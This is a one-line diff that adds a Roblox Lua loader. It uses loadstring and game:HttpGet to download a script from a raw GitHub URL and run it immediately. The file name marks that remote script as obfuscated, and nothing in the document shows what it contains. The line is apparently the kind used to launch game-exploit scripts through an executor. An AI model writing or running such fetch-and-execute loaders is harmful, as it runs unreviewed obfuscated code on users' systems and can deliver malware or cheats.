@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ProCoderTT/custom/refs/heads/main/alive%20accessory%20idk%20bro%20OBFUSCATED.lua"))()
